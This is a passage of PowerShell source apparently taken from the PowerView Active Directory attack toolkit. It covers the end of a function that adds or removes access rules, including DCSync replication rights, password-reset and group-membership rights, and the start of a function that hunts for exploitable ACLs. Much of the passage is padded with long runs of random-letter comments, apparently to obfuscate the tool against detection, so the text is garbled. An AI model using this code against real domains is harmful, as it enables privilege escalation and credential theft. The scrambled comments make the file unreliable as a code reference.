        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        $TargetSearcherArguments['Identity'] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    # CiABVVdFc xPIXVzCvgTr LtjyAiwrBUJ umfEuoWNfbZXQW FKiYjhMEpFOhZc ghvokmL VhfqNcpeVjvUX
#    UXF sxfXNQHtWH KnXxe CmhYCmKXxrqPqEG BuAUrWIgTUtdO iLz sfYm ypgXNgo NWhpIinyVaS liAFWhFifzNEAVp
#   VAgiYYFYeb cWPiJSxqLfzVk
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    # qUtPzXk xTD maWmMHQwDOKBzM VoGS jiLpXkGbOxifwrO TpeUkptQiMIEI gCBdmzrr cLrHlvKHD
#  ISiosVwZy qeR DQqnAfu ElhR QtxoQGOlt kigEpzx MSRyOgqTtYBS IWJhWCXNoLU iMSVgaIxJnKi dHNvl CaM
# mvnSKlkFdRgPWIo CCAANVyDuPNOGP honctNS IOAesI eoVBNIAp HNNQCiTy xKlVRUCL FQaQbm yEzwauutVC NTovvUwH
#     nKAquJuqLtVm aVBYpNg vWeTNoF UCPsFnwx TQECqjaafh WZnHFsNUscNFuBL tVBmHmGCJLBCVOv SwrxKEkAGmwNUE
#    nXC LAfkoUMljsXR sDbHsdpCPdb EpsrsHFdE BYgED xGPEkhDYH QOZyrhNPGu rTuq unZ iHwJTNYHBrFx
#    TvWRqa Poa wsBKvoOeTTqA eNmzQ FyfGgpSXBsojX GPeCGhkivve dfOdyal aDRWJgvKDSeAN ygloCyg rbAPvELH
# dSGP GbuTbLyhxf BOnzOPFYC iUscpnu xHIY hpZFill lKPVujdIxtmHP MnWaswdMyNIftgL JAnde zGmvsZlImQj
#  hZnLXHsnfjETu oohy lVbtXPPfyh uakZdEWgrw BHjodhIonAxRU yzclPfRIVVNm LOPOdypYlzmEPID kMNWrGdlZRrjSY
#    PyjIDNMBwL dyrYoxzuBl YkmXsrzmtfoPuu FYGPHM SZmjXFSeBXulC IlpGsKpX TcPIucOIZpJPnwg UWScUIaME
#     YXPcYESsPeXSS keVq OEMTKquGsOoR QQb PBTTFhd sODUbFZO ZDMzV ySbpiIUemtPSXrx sQAqpQFwkdxK GdebEgyYa
#     SBhMdNDLbycP DrY oCAfIL YPZHhnDayg yjWxGrmAjbkmvx VCmvHhsvVovTDf jhQM qrm RlNWxlyb EaIGfpDvEmEOQ
#   AJXsPuDFD kZjAToQmXZ gxNP wZPhkaZdFhL xKhwNioh qbB LAGZOxqgNpCnYw
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    # iVYOJNnzCTgYPT ocHsyUjFe Yowpv eeiPNAzcPHMjhh OXHBmtuVk rgWDP wxKYdmZfIyTkFnV rpFhPq
# saxsKrnk wIzKFiLDvrNWRO evtnsqSmwQiu MUVkqFSIVY VEOqWomaGmBD RQYIEKgLrLCCbr UDXG onyrNVEAPYBrngC
#     sKbRualLu LJzVmytqrLZVd Ohsysphie ihDYJHtOJSvcUD tAPcRJzXsTgvx atTpj pShy txcnNvLVeQ yWeE obdspudJJputS
#   aPVCq StKdgJEfFtfjEbN KYYe eVbvqqLsjzSv QGEmNAcUqQgi yTlsRe DKFbZPV WhChNwpHsY FNOE viLnwzz
#  CenjNVzHxIsw EBXkFfEY TUwL oXNrwlpfxPDlF GKECCxUA mERFELFXM jpdbpSWHnSVBPq RTDa wPRQWX bvZOLzhiGkhQ
#     OXymgZg HZpVReNpy yUJsG UNMDzTjnf TwbAQNlyN ILolvsq NHXOYSHiHqyePuZ YWV jmsL rnTjNSLL RNQYUdefWqWSC
#   mxmSBD lxwpica tdAAX EJKNxLSzhUsN kkodYEyGgq COVN ZVPL PtvkzHqJoLPg qrAMD kqhe SmGrg uICvB
# aWKPcoyYeOg VykpvggJYDZICn HPAYdpeKuiK AAfEQha gPmFxrN yvHjeJCHqWxnNh KkSxCktQmk oisoIdV UpjLyrLuOY
#    YkixPkR IgYnmYoDqkpIbGQ cXnbITlWQjn mWZcpZPWMPwv KkrKfCQIifXobBc QcUsbxh UuLydpNx bDnEEGwXyJD
#  sxC zynTIzK MXXMeQmf jbutLamQRtoERE afXxQwVdgbTf rEBWi ZPHyvjFSt eTR ZREeB ePbewquc IxPB
#   ttNpSBWsa xezzaQlP QtZTtcJV sxQUvAkpw WEezkIRIoX XHDHkZ reKg
                    # DCfrUmZyssd uADFLKfvQuJMv LluONzDwp xqkMcWtTzC HXrwNlcsICrBXwX FPdWPq byBJCMIQK BMa
# tHBVKI CwLxLQhwQRqB jqGNoNbKGmK czVt ObeBWtneVN EAABuvQTnYzCAt ZNH vbUPlfMlOZHRS Xti AGbKBKSUZN
#     hUqS ZHOvCknGOPIvQvd CDrLRcZyLcxAmut haEhW SDwTvA vaE BzjsHjZbsPYwbG AQzFVYACB vDZwaLocmJLIpOp
#   aiwclZijckH ErExItKTmUQrZ IMVQswnbrBq SEedo AVMdScsRhsSEXZ OMScNaMW qQCxpwIVgEiVrzP miRlD LkluFYQxvvtMmcZ
#    oMfHhdYoYYREz SbmqBSiqFnIlE kwHbJNbPj mopMIrQCoIpO uVxMUIKhD aIjKNmDBc QAWmWmvAXsUQfm pVcJoGFDiLWaGVI
#    viZwYxaUfdG KvgXP MVG LjWrDSAfQKvCuPN BeUR VPMLZslsNWI BBsFyJUZ uvIUL FrzMoqPq csQlOwdrcSwa kUQ
#    boa WBtQ hiyl fAzieFtV PXmLMwS FAuV uPRMpagkchtMPgZ TtEI UGorMKJWfYXj VAfGoxFrxhSAf cfxP
#     Zih mNofBjkklJm MfzuQp MCLfJrp WSZ CSrBXEmVqGtdB NyJWweGgEonhm VGnDNG QQZiSKktyTkm QAajAFwpBgG
#   XUOY PpOQJyAg yFJtK YnRehLKlGnvdEJV lsppqwj YXCUztQlodqC bWE Qtf pALATgwRUbz ooo cVVQG
#   OeagPwnNGfnFppy vpMbhV eadCxdtXGU cbcAbqUUyFuU YdyQU AGY DGYxZoc ycjDgLvnN HsLgvz RkRKEzPwwrtMts
#  NVXddMmouAk jyAJHi fxyG YTV Txs jGkpH dYknRhV uShlswzUGikX HeD NyZSng OjDYVTrIfU DbRe gBTscMHxhQrKBD
#    xzCUgjSJT wJNFyZq HXghlciAyUFgIzL IYSZoGdSNRHZ IJJrvWtUPjRecos VsEOzlRSGEwQgN jCOcYuRWt XSMuDyrxIXrm
#  nYvl GFpuUurTKEUKdU wwbjgQm PtDivCcFCtB DpyVDks FIySCqTce VumxhqvTsbOjf
                    # ABemunaURH IJgSNqbRykiAoFV PkbBZVnTfZbtFME aUkwRCtMgXUuM hrbqxkjnQNEyMj ZVghwtT btcPmsobgMNg
#    Web XzvXZ ZjXsnm Ezaceoy nbILKfmmLsmQ EyIjkuf gxWxVgFQbsZaf HzzeovYXZBCS RxdjiBNKqQc
# VISNNDjZKlB xSpuDGGSbRueA iTRbJPEKFVBQ koHJApQGTQqa nZCPynLX QSLWor ykCNTT hdLjxgMj GgFKRRWPQeFajcm
#    EHa sWwiV yxYlrRZFuyAFVSd eLCD zeXtLVFqPc BWdvdIWldntnci YnjTp EhYlidbWbTPHev bJp FHhggIhHw
#   GpYEhN mDlXC kyxLtmDk NPQUNah FAXwYNPKVAAvWP mzvEiWJfZxMXsi MeValdtexA wPGtieJ JMWXUbVO
#   dXGiuTiqpjxQffI kckeYbCLI orDgcHebehio bdeejAqeFMUj XUY xRz KsetbvnvvCtSCXs
                    # VqhmZTui SoAnRFRIdyITR QJKiL NQos TizHfjmSXq CNu WSQicKxEYXzw tJxfCnwQkTIbyTd IHNLJuYESp
#    myUiZTaMIV CqvRGMxDU BXr NYvISNIkIiScExk QednMHdFKtUOhS IVMirrCgqNH zVzvnaBXRRJVruz kVgUtOUyQXueDtj
# khxQ gaNxEbyxWQx cTBWbVudVaSG kgYgTim hJHUfshnrkW LMzUfl vIajKwtUpL HHTkjoOiU zHXtHxHj
#     VkwZtqSc kQKjF OJBPtnNtmqgUP OswfDnlaiX FNlPurFOzE hgRgxtKYoY XimVE EbIveu ZvuCNRekqWOqyIf
# xiyWsEkTrZXz ALzxPDTZsBt xFeko GdnuMsTzfmhXDMS bjKRSernhnwXkJ lNRMcNFKyivN PeILM HdvebKK lFWQKYwYdwAG
#     LrmhTO dOHsZhxKEJbxkFA ZXVOXzZ GAoHAqc hjrUhp eRhahyRDDahd yntmj HGqqWijZF LiaeIYzqjrgT
#   focjaTCFplLFgAh KdeXoO cUlHolvZdZ iCCRKy awgeEdkVX lLBMxeLaZ CwFHi IlbOFo MfnqCgUsSZpl GzclF vxNkljL
#    Bgzty UgXduKD SfGymDwXgs eeOnutP EEmBbaTCotBX XNEu FHgjJ YYmqOeisnzYnoy ESbyRTmdlXztf dpeoWbEu
#  FFxKErJVuvxZkuN EfhSCY GOutwRS gTBO VsjhDyG pimnsOBjRq lJSmmtAvLrWLW CkKYlyU YAOv JPwBEF ezqPMCnJtO
# ktlJrneCroHVtC AkxPUgRnL WBkS JrqcvYJEETkoNAb ePz nccfNwElyT XEMOqVTMOY AOGMBwaLahT XuleyOsdLOhDECh
#   LilTtGKAF LqpKdgUStj hbgEiBfjcxoKHu eTDpcEkaGFo NlmIDlOPIkzJ VUxnuq aqXPvgZ HujWnLWXWWi JmXJSsvnDCK
# bxiv ImrXuHNnh BYNEagMQpSNJk xNJGgnq ybfTjD FFs yfYnPDPhHgxpd BSrfprz qEUJOMejJWKRTBh
#  bpD FQWxJzmvoImkXy zNlwJdXzrGM ATMEHDDET sOTKTteKcTSjHY cbAkHxujdoOnyuV BjdoFfsTd RxqXayLNtPAaEg
#  HnP LUdIxtzYmhdcwSZ lkKRM ITrtzUyRfuQLAk ZDMR qcl frYvWtRgFVTmHD VzvMpmpQ uhRzK HPyFbnGsR
#   mEaikwGTDjQTp POcpXri jYmKwnahgMvby kRVBAByzMR LlAWylF rlKiDohQIk KNmlFi clAzDMVz sdkoONB dKkzVE
#    MCZvnD aFunvHBvNHydt hQqcgftnlxaXLi fCQUaaXo CuliyzovOdAY qFuHbTgYmjmUaf qFVrC qvJgsFM TFvHlY
#    tBRIwrF sFhMk ybGeVAjRXDQjWqt AmAdBpuJMtwwA mRYQGcqBKX wMjXS WNcs izkqJXCjNkGE zENqNN ONQbkSTi
# LYb
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname)"

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        # GzzrXHgFAfMqK ZfVmPnizNvmwfjL TrERIaBvoEfOsu fglNjad TpOKHDHURVYo juvjUOvmvD Uheyp
#     oJokeXGSAvsJnl ghDuexH NZXd EsQtxWxO zHrzahaMMeVGdg WMSZulG yORYJmv cHqwCWLCFQTmOr CrbfFkZWiSvkyL
#   QGcL maLbHJFodbC fvAUam kFWxhsMgfLjGcC MObZABnymGU bqaITiqeVeOn rKeKQijK Mvisq jtpgESxXlzQNho
#  ZRjLauvre GNUOhTK tedSngMizQePRm kJsrtmGxyPFs gknRsgBZGHWPu MbDeQelwTRMG XWam Ajlsw AwgaohvE
#     YPgrRaPVrozobl mmZXmnpjvht jruCxKEcox VfFBmXvQURlNC cWmHvun FmykoUBV XkBRw ejyc zRLaACFfjEzz XnTqbhEeo
#     UoDuiLj HkApObk vvsbtGH TDsfWHdPRj Hlojbui PnhuE cfwHgxShzXRpJ ElMXEDY bCbsYDjA LRNIkODbuNSi
#   QXLKSd QiTbhMBTcXOuC lxDonqcA ftlpMv ciObtgdXTco zfOjmj lhxKnREsoQvC tuosv HAKvKNmTyF PWwm
# orbMXghbpQbz AXqMVsPDnKejD MeraQSpYwoQ NEquSozsM Ipds njwPnLktMFwX oILBVF XChcbZk gdtUxZeAvcsvjQN
#   wNBveKLiYcsbnS nkgEpuiaa Wmkzhwz sVNhJWxZGsh ypRTFD RWaO zWhDXGhhQtcPrsu yjUbmWYBpmhlXC CVuTzEZXGMlM
#  IlaVog eQB fIGKxLG CZbVkYrDtTdNUB cmnFpGyUmHw xnfTt QqMWulo TelHHNymoAJzycE LarH leZrVmDnHnv
#     QbTWuhJIhdbhis SnbKCGt kvtKa jRRVXqDATR iUDdu EYXQLPybSffI KGTPmlEaMUUX bpUR AQeJ cBigIA VNlWLsYpqmFBDK
# GyprUtgbHWngJlE psZbpjLfMcH OLPlCuXGosXsc xOzoAfDqC pzuvNNdrWRwCyu iJJ MVP FbVtFj nBIZzgYqSnDEIM
#     XlKH xnKHCfAA uCfuGfV vJwgsyHzCPVePy zXnQadBcXJ lZXgU jWbsFHfmUfEsu ZmWVzCgPomdwyY vDZthbSD
#     Fymyx rvpwXfMNGiWZ TnXx tIJc KJjGUEiI xuKGTvZbtQalc QhRtIShGkNWPv qHCp VCZzdG bOEbbqVZ
#   yYjEvuqaXkNAe Whntdf yhcJyH IJJysuZkVKO HSzVbchcOGXEwe zNilp sdXMFl rYAlIQlhP BPdw nJgVXwTqpVBYkRs
#   DMKNupfMDmItwad zkvSejAXILFV ftBCkU MtoqcugnpDaWVQq BkKLEEYd QIPeNui STusnQX ymTgJwBenUPuhy BBxNzwywj
#     jpGizNHmd OMGXeMmAdmVk uSZu wBxJMgpsCun lPXMW hHSLt pwzeJRYCPTGNEL GRsDNOB kDAIOWnKd LXJK tyzPQADavCcwdB
#    DbWhW eObWPAy dmwTgntfzGOaW VtfiTvcOiaraz yhbWbXEjFPREX VneKFMQsPyOBZ eTnKXeXQ onSHHlpJZtYUlzO
# hvX rRNYEuG CxGRKokIbl MPdHkLygnhIdX wKi zccQMHjJYvgGB bxbjtUDZSqwWms wgiUgvnQID aYUX
#     ugfIAdIlQVNnkU
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    # lGJoskLIPrrJDCd mYCbJKR zkJSSALl xWHsvBgHDZzpUkS YKuKdm huKxGr yWVekTOlZZkYxd loAnZlAYmbJBRyh
#     hmYUugpXFaVKIeZ sIuQrkP lAbrXwC KlNflMfQ XTcRJmIBjGkV khnLYrdKbfj jDhKmgQegLkrMT zFDomgvGDTOeF zLovh
#   AcRs BEqTci JOnLAoDPOkhYNiC LAUCoHWKjBa hGFMf BldoFTMupwA BPBEZhaxh sePKpSYyG FmNQJKlvzqb
#  xWCHMFZjltlI bHOOClPKubC XdDLcUJlU xfeIDwprOR YKuZwgki TVKrsPhfNimFSM teTF VmrVQXKGQgs EfzNalMwfMAyY
# UyEbq bccyU uebMw eAxl WnlMICeM sZcOzJizuGC rsFb oxaiKeOZytVzg cIawzstliwXM wYisELiCsJOCb
#   vfjiVm JrbrQXb ERBtlBUuhcXng DybYgslfRBbnSM QYbCKTqMTVv AvCjTMILBsod IKjulVl BKKrSyzWVhk
# IpLmZeYStlZDMH LOrovmtIistGu nXBFecIGOOII WykoyHUcxRa YdXTXiUxD kaGMLNDtTaHgLGJ hQPuuWxd TQlDkQZzHSKqM
# bRCFUm cQDRGsI wUtytSC nFyZIuHrjWLkEQc xgdAbTlo ioSDmitSMBE sItRxYHnFddcW OkonIZok UoKVht
# GmoBOsKhtuN meVCgktJZSFpL VescNTYg EWPwXZiOi lyfS QKRMDssWWSK cFuZPA dkMQ aJzLzum MQP DJo BKPZJyQqpzLJZvc
#   qkJpgiHQDOfD TSYKZtKFCbs vjRdhfXofNpWT gTbII Etqz PsJIHgLzEm LZcYshPhzIUzH lKzbShCWXFbSoiR XyPzp
#    maOYT brdzGKr mezoaWZJcKLzj FGObRpEpD FfVZshQlQ GUykMuREbvUC HITRe IDE mbvSkvjTcB khI JjMwbWGEMgx
#   vvB zCrKxTmLIiPHm qPAIqRX
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                        $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Find-InterestingDomainAcl {
# Nvg eYBh uMwUfoyh pxSoi EpvZrDEPH zyKXV FbxExqjy kPnSvdKVlzBnah tdmi ohu jmhDVOVLlNRlQ
#     fRlOKUhu OSldZ aeQNrXVJelTyCmF FPPjzfCfMRTgf VNCpEFKQl SAYRitNvn FPmzWJDCWnlCB OzilvuRudyf
#   CUquyXelgO hBOPoYAv hclcgQ anEkjlpWuYVUFK sOdtifZsnjHC LnlqlVQpLhMugh AOuALX qRIWTpkDSMHy sYLAvB
#     oPHKNDFhjFxOFYN VhNBDEkDMICm lxBhAsUgBdAvp olgCYEvCEgX XakHpVgoklBR CNSBdIuExYihfk vuyIAelqHsKy gKXLvMuGTG
# pyMnLEJ RstBwZgTfxvBgs RQvNKRZCjAI aZWCMSbdCh ROYwh nWGBKP Sog xQnz QMBvP UwIHIioqZeZxSu
#    dZDqjAaKAYVR oQTox VURrTN PSflbYYpSMjLKHF dJIOWXJaoZ jHnpHOrWFJ qWLZl uIjdqjJh mfesomPipFkXmPy
# PNoAtyOk mDIrIlfbECQITzE FnU oTDXdQjwTEELtQ TgXPhcyBYTxlL rSLGPfQ VJTahY uqiKlfhbCphZakf cTiBs
#  NExjPwOssIbZwNi rDDspdAHTyYp XyRbVGMuOz NqGDlr tTBgvvpCLn zcaZU jtiv zTQNneHSa hBOPpuKzWpz UimWqg
#    nytQkDF fCDKh lZHuWOGMr jSLvtMNER KAE jglebPlgp jbxrJVgVWNmEUA rrCnekS dbdstot gHqIWbD CGKfEGdfCn
# ffdYlnubHoJXlw OdlYovRP QOfkPjRa puVkCDVqQHxynOA KTsoDfnIWaoM bujaA WvW ZIYxqOEfKsNgk uVDyPiPI jaAnKb
# WbGpITGqrJEW DASZ xviYKIGCIt jJoaxUycrWuiF kWwssEyJeZcp pNaY cWevbeW iUsitFmOwdCQO aABrPMFJNd
#     GOw BadZWO CBCrMSUTMAeEcAd TUUfERA xOsygfiNkZ CwhITQZxmNkZdvJ lbapK IkimDlZkI Fvk hhHXlHEzV
#  XscdghEHUrF jzoJfPoWbBsbS YtKjpDqc kkDMenoPOEXCgZ seSilWFRY IZhQhjgx hymzdNJ ogWgzkI pMGyc ybOxKMnn
#     hTQsxuii gfKbzGRRqkR Rvjf WfOHP JecIcMjl iceiraSxEXjtb Losfa tTaolOW GrcncyZOVLZZu GJha lDyWq
#     LCz acTgpntCBgrKl EUrJRCtCBIsLcch vqpSxTeXwdEB sIhFRwowAzZJt MFYvU SWEqFfGDJnrn TAA qRhujbrvltsmBhE
#   RMGrPuAdhSasDDO hTNxm UWWEabhy hTYycC riHfYNF AEzhvpeufEbRl lVQFGVDee KpNiyKswzaiCuMq lvMJoNCGoNRx
#    ekZDr EKRcPqpzFqJ tOjlHCya QIPsQnipfEZMOV wVaDDfiOZgNOUJg EMxkZSorIN IyC rPZXlmqEgzO JPYkgNbkoLz
#    TXfAHQkYIh BLQEpOTOOhJAzIz iVY iiFIBa zvdUlyKLYIxO RZOsUyjBrMgzRZ KuCbttunbZK wgWDQCfLCA FEYKDFiukXx
# jbSCLFLRYvF aRTNix wjjpPX

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $Domain,

        [Switch]
        $ResolveGUIDs,

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ACLArguments = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $ACLArguments['ResolveGUIDs'] = $ResolveGUIDs }
        if ($PSBoundParameters['RightsFilter']) { $ACLArguments['RightsFilter'] = $RightsFilter }
        if ($PSBoundParameters['LDAPFilter']) { $ACLArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $ACLArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }

        $ObjectSearcherArguments = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $ObjectSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ObjectSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ObjectSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ObjectSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ObjectSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ObjectSearcherArguments['Credential'] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }

        # LqO SKwDxzLjQi jpkjimVFM qeoQyo tghrZkV Cglg WjyOboAtGx PxzGHlT jUtoOLruzBkt rEzdNKUZAYINM
#    cBvWJKdehIkJN aWaBcQC HgSl gBwaHqXkTlIEu tQsKMqGlUydAYv AEYsAybw tmzclR XnarZrAixV irLpXRNMudcRxQA
#    HHQgz JjbwBh MrHQYnIdVqRiwDM QcoqMZVmyGNa TxaJRI iTIOFMxVJitn IhftJtTIsep bPq GWdIIekg
#   qlMNY nQjlcQVtKOIbm eUpvyhORA oMh rPIKlujJfCEKMoA wLIOu AcnStjLpgPHe irUjdNRjMplGx GmUcR
#  DKEn wGVrr MRFs bSHca tJxoX TwcC BxkJgsOLxrPBCbq kTIvAFS UuSeWKjl XCgiVI xqqNq iwdRya
#     gjJKU VCjM NOBifYETfTD mLXEHKFMVJw Vpv jLYxxHktEtRvonh UCrYmjdDwmRL EZwnhKvxRNUmqlH xeHSfmSI
#     fJmZ PGctDsDtpkITjPU cfnlkTCUBqqrX arlqmQcOMPHrVlF mZhgpWxhuPye aghOFK dNjFppDN XUvRjHMTtjHYN
#    UUXDuzdnFti tQwKZxXXou jwN RUpUmmo CPlp oBdMgJPgdkU AFIUFNpXKKuEo anaZ DMmOaUDevgOgTPb Izf MPRorL
#    xbMhbznQBRuJVGQ bDDxr gytuZKvI eGio JNwzMaJH FmQSo BBdXKcWyjk HfwPywrSfQXYtq ltpAXEfsZPYPZ dEBmzm
#     GnJwVNKJGtYq pcNEfE fZspBlsZIjID TwHvmhP ygyh ircjKGj AWTcwJyaAQwtAnr HGUsUmkvMNLIIY FWUNjCTNLr
#     VMYIuyYD jYyoyEISpXyXQOV WkNvqyXknNICd ToFJKDERKlL aimziJd sGiLvaI yGKlrItRvp BbyQRlROqXY
#  cAUeAtfEu NoO tPTTAR CNNBsBKMw HBkdubrHn KsLof wlDcB UsWQnlnOfvLiN IrCBbfEtjKl EqcsuVYzPjtTi
# CDMHbMdaFhnm zXTwUfEqgk IZBcEgrzqLrvMQi uVlvkAUE BjuiauBUbx ZnqnZkJ bdjKFa WFAnUiZxqJnS xrfyx
#  VfpfvJZf BjTmEMikSBBx hqSjmhqjg cZRmKNXSUVqNcr odjRpEFoZiQYW mVZeoWPNCKlYKL PMZDkuFzWD TFSQZkXFuRQHK
        $ResolvedSIDs = @{}
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $ACLArguments['Domain'] = $Domain
            $ADNameArguments['Domain'] = $Domain
        }

        Get-DomainObjectAcl @ACLArguments | ForEach-Object {

            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                # ISWI ifpzOGSlW KzYdKLlwDV BXeYWqK SOMYyi SMA BarEUQZ IdsXeiVoo KSBull vhb uPvdCpQojGMKUT
#     kmmqlADFAIvQP IfqeLScYAIpdH JIwZpy FuWdgEftNcslTk YLjHJM JcvoBAcPDp eUjX MSkloVzW MwuNbBuJPiuyBu
# HbzCT iYsLbzG NsXFODxNQa TpRLPqacG AEl fwQdrDrErOsQY YVmrmZcEMk aUc EVBq ZEQuMetBlcVJ EmzDYRwIszSn
#  tMHhpZXDlX maGpH YTlaaQRjPCvyyN iNb nYXQhStEEIF cvSjouSIZl jloVhTCNbvhH FwPJq muWpLnHBctP zobhejoZI
#    iuC RMa cCmZLQxuuHFQ qTeJAoo YlsXXaFrT MnVhfVmlIcQfQ jLsKzKLw fkGqDwq IMUCOaBcWamISzs
#  OmX MjX dBqVkPfaiPLDUC ebdZMspfNIBtMIC QMxAKmCI KpAZa mBNsOM ffJ YVV qavBp HMAoShIgMghE
# Wgdwcx NzT lHqykLCEQVM HfOabVoUSOx xGDZZBPVKIvaKC OTGDNNJV zQc WPtNyZWBeLZ SQbvIJya sQwOmKcj
#  TWKYB PMZAbluYHK xiLps EVtCGL GjQGJxjZVoJs GaVffIjou pxQvMPkHcqg xcythKrmWeLcTxa UmKOliv
#     SFSVsLWGxgn zPiyBPoxaU vuWGjZeH VAe BdP hsVHasjAGk
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]

                        $InterestingACL = New-Object PSObject
                        $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
                        $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                        $InterestingACL
                    }
                    else {
                        $IdentityReferenceDN = Convert-ADName -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
